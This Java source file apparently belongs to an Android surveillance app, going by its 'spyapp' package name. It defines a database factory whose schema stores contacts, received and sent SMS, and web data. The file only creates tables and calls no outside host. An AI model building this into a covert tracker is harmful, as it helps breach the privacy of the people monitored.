package com.example.spyapp.sqlite;

import com.example.spyapp.sms.SMSUtil;

import android.content.Context;
import android.database.sqlite.SQLiteException;

public class SQLFactory {
	
	private SQLFactory() {		
	}
	
	private static SQLFactory mFact;
	
	public static SQLFactory getInstance() {
		if (mFact == null) {
			mFact = new SQLFactory();
		}
		return mFact;
	}
			
	public boolean tryInit(SqlDb db) {
		try {
			db.initialize(true);			
		} catch (SQLiteException e) {
			if (e.getMessage().contains("downgrade database from")) {
				return false;
			}			
		}
		return true;
	}
			
	public SqlDb getMainDb(Context context) {
		DBSchema scheme = new DBSchema();
		scheme.addTable(SMSUtil.TBL_CONTACT, DBConst.CONTACTS_COLUMNS, DBConst.CONTACTS_DATATYPES);
		scheme.addTable(SMSUtil.INBOX_TBL_SMS, SMSUtil.INBOX_SMS_COLUMNS, SMSUtil.SMS_DATATYPES);
		scheme.addTable(SMSUtil.TBL_WEB, SMSUtil.WEB_COLUMNS, SMSUtil.WEB_DATATYPES);
		scheme.addTable(SMSUtil.TBL_SENT_SMS, SMSUtil.INBOX_SMS_COLUMNS, SMSUtil.SMS_DATATYPES);
		SqlDb sDb = new SqlDb(context);
		sDb.setDBName(DBConst.F_MAIN_DB);
		sDb.setDBSchema(scheme);
		sDb.initialize();
		return sDb;
	}
	
	public static DBSchema getSMSDbSchema() {
		DBSchema smsDBBuilder = new DBSchema();		
		smsDBBuilder.addTable(SMSUtil.INBOX_TBL_SMS, SMSUtil.INBOX_SMS_COLUMNS);
		return smsDBBuilder;
	}

	
}